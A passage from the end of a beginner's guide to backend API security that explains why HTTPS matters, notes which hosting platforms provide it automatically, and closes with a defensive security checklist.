  ┌────────────┐  POST /api/login           ┌────────────┐
  │  Frontend  │  email: user@example.com   │   Server   │
  │            │  password: mypassword123   │            │
  │            │ ─────────────────────────▶ │            │
  └────────────┘  (visible to anyone        └────────────┘
                   watching the network)
```

**HTTPS** (HTTP + TLS) encrypts everything between the client and server. Even if someone intercepts the traffic, they see scrambled data they can't read:

```
  HTTPS (encrypted):
  ┌────────────┐  x9Kp2mQ8rL4vN7wZ...      ┌────────────┐
  │  Frontend  │ ─────────────────────────▶ │   Server   │
  │            │  (unreadable to anyone     │            │
  └────────────┘   in the middle)           └────────────┘
```

### Why It Matters for Everything in This Doc

Without HTTPS, all your other security measures have a gap:

| What You Built | Without HTTPS |
|----------------|---------------|
| JWT tokens in headers | Tokens can be stolen in transit and reused |
| Passwords sent at login | Passwords are visible on the network |
| API keys in headers | Keys can be intercepted and abused |
| Sensitive data in responses | Anyone watching can read your users' data |

HTTPS is the foundation that makes everything else meaningful. A stolen JWT token or intercepted password bypasses all your authentication logic entirely.

### Do You Need to Set This Up Yourself?

For **local development** — no. `http://localhost` is fine because traffic never leaves your machine.

For **production** — yes, but most hosting platforms handle it for you automatically:

| Platform | HTTPS |
|----------|-------|
| **Render** | Free HTTPS on all deployments, automatic |
| **Railway** | Free HTTPS, automatic |
| **Vercel** | Free HTTPS, automatic |
| **Netlify** | Free HTTPS, automatic |
| **AWS / DigitalOcean** | You configure it yourself (more complex) |

If you're deploying to Render, Railway, or Vercel, you get HTTPS for free without any extra configuration. Just make sure your frontend is calling `https://` URLs in production, not `http://`.

> **One rule to remember:** never deploy a real app that handles user data over plain HTTP. HTTPS is non-negotiable in production.

## Final Security Checklist

As a quick reference, here's everything this doc covered:

- **Authenticate and authorize every request** — JWT proves identity; middleware enforces permissions
- **Protect your secrets** — keep passwords and keys in `.env`, never in your code or GitHub
- **Control who can talk to your API** — configure CORS to whitelist only trusted frontends
- **Use Helmet** — one line sets a strong baseline of secure HTTP headers against XSS, clickjacking, and more
- **Validate every input** — never trust `req.body`, `req.params`, or `req.query`
- **Hash passwords** — use bcrypt; never store plain text
- **Handle errors gracefully** — log with Winston, send generic messages to the client
- **Use HTTPS in production** — encrypts all data in transit; most platforms provide it automatically

### 💡 Security Mindset

Think defensively:

- Assume clients can lie or make mistakes.  
- Assume data can be tampered with in transit.  
- Assume secrets will leak if you hardcode them.  
- Assume someone will test every route for weaknesses.

If you build your API with those assumptions in mind — validating input, protecting data, and verifying every request — you'll have a backend that's reliable, resilient, and secure enough for real-world use.
